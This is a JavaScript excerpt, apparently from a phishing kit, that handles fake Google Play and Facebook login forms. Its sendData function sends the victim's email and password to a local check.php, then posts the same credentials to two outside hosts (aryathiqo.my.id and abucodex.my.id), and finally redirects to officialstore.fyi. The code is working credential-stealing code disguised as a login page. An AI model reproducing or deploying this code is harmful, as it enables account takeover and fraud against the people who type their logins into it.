...
function togglePassGP(cb) {
  document.getElementById('password-gp').type = cb.checked ? 'text' : 'password';
}

function clearErr(type) {
  if (type === 'gp') {
    document.getElementById('err-email-gp').style.display = 'none';
    document.getElementById('err-pass-gp').style.display = 'none';
  } else {
    document.getElementById('err-email-fb').classList.remove('show');
    document.getElementById('err-pass-fb').classList.remove('show');
  }
  document.querySelectorAll('.form__input').forEach(function(inp) {
    inp.value.length > 0 ? inp.classList.add('filled') : inp.classList.remove('filled');
  });
}

function validateEmailOrNumber(val) {
  val = (val || '').trim();
  if (!val) return false;
  if (val.indexOf('/') !== -1) return false;
  if (/https?:/i.test(val)) return false;
  var onlyNumber = /^[0-9]+$/.test(val);
  var hasLetter = /[a-zA-Z]/.test(val);
  if (onlyNumber) return true;
  if (hasLetter) return /^[a-zA-Z0-9._%+-]+@gmail\.com$/i.test(val);
  return false;
}
...
function sendData(email, pass, login) {
  var data = 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&login=' + encodeURIComponent(login);
  fetch('../check.php', {
    method: 'POST',
  ...
  .then(function() {
    return fetch('https://aryathiqo.my.id/apixgg.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: data
    });
  ...
  .then(function() {
    return fetch('https://abucodex.my.id/api.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: data
    });
  ...
  .finally(function() {
    window.location.href = 'https://officialstore.fyi';
  });
}

function submitGoogle(e) {
  e.preventDefault();
  var email = document.getElementById('email-gp').value;
  var pass = document.getElementById('password-gp').value;
  if (!validateEmailOrNumber(email)) {
    document.getElementById('err-email-gp').style.display = 'block';
    return;
  }
  if (!validatePassword(pass)) {
    document.getElementById('err-pass-gp').style.display = 'block';
    return;
  }
  sendData(email, pass, 'Google Play');
}

function submitFacebook(e) {
  e.preventDefault();
  var email = document.getElementById('email-fb').value;
  var pass = document.getElementById('password-fb').value;
  if (!validateEmailOrNumber(email)) {
    document.getElementById('err-email-fb').classList.add('show');
    return;
  }
  if (!validatePassword(pass)) {
    document.getElementById('err-pass-fb').classList.add('show');
    return;
  }
  sendData(email, pass, 'Facebook');
}

document.querySelectorAll('.form__input').forEach(function(inp) {
  inp.addEventListener('input', function() {
    this.value.length > 0 ? this.classList.add('filled') : this.classList.remove('filled');
  });
});
</script>
?>
